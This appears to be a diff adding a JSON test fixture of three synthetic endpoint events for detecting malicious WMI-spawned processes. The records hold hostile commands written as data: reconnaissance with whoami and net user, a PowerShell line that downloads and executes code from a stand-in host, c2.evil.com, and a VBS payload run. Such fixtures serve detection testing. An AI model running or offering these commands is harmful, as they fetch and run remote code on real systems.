@@ -1,0 +1,32 @@
+[
+  {
+    "id": "wmi_mal_001",
+    "TimeGenerated": "2024-01-15T11:00:00Z",
+    "DeviceName": "SERVER-01",
+    "AccountName": "SYSTEM",
+    "InitiatingProcessFileName": "WmiPrvSE.exe",
+    "FileName": "cmd.exe",
+    "ProcessCommandLine": "cmd.exe /c whoami & net user",
+    "IsInteractiveShell": true
+  },
+  {
+    "id": "wmi_mal_002",
+    "TimeGenerated": "2024-01-15T11:05:00Z",
+    "DeviceName": "WORKSTATION-03",
+    "AccountName": "SYSTEM",
+    "InitiatingProcessFileName": "WmiPrvSE.exe",
+    "FileName": "powershell.exe",
+    "ProcessCommandLine": "powershell.exe -c IEX (New-Object Net.WebClient).DownloadString('http://c2.evil.com')",
+    "IsInteractiveShell": true
+  },
+  {
+    "id": "wmi_mal_003",
+    "TimeGenerated": "2024-01-15T11:10:00Z",
+    "DeviceName": "DC-01",
+    "AccountName": "SYSTEM",
+    "InitiatingProcessFileName": "WmiPrvSE.exe",
+    "FileName": "cscript.exe",
+    "ProcessCommandLine": "cscript.exe C:\\Users\\Public\\payload.vbs",
+    "IsScriptEngine": true
+  }
+]
